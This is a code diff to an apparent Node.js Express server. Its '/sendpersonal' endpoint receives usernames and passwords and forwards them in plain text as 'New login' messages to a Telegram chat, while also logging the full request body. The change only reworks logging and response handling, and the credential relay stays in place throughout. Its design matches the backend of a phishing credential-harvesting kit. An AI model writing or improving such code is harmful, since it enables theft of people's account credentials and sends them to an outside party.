@@ -49,25 +49,23 @@ app.post('/send', async (req, res) => {
 
 app.post('/sendpersonal', async (req, res) => {
   const { username, password } = req.body;
-  console.log("Received data:", req.body);
+  console.log("📥 Received data:", req.body);
 
-   if (!username || !password) {
-    res.setHeader('Content-Type', 'application/json');
-    return res.status(400).json({ success: false, message: 'username and password  required' });
+  if (!username || !password) {
+    console.log("❌ Missing fields");
+    return res.status(400).json({ success: false, message: 'username and password required' });
   }
 
- const message = `New login: Username: ${username}\nPassword: ${password}`;
+  const message = `New login:\nUsername: ${username}\nPassword: ${password}`;
 
   try {
-    await sendTelegramMessage(message);
-    console.log('Telegram Token:', process.env.TELEGRAM_TOKEN?.slice(0, 10) + '...');
-    console.log('Chat ID:', process.env.CHAT_ID);
+    const response = await sendTelegramMessage(message);
+    console.log("✅ Message sent to Telegram:", response.data);
 
-    res.setHeader('Content-Type', 'application/json');
-    res.status(200).json({ success: true, message: 'Message sent successfully' });
+    return res.status(200).json({ success: true, message: 'Message sent successfully' });
   } catch (error) {
-    console.error('Error sending message:', error.response?.data || error.message);
-    res.status(500).json({ error: 'Failed to send message' });
+    console.error("❌ Telegram error:", error.response?.data || error.message);
+    return res.status(500).json({ error: 'Failed to send message' });
   }
 });
 
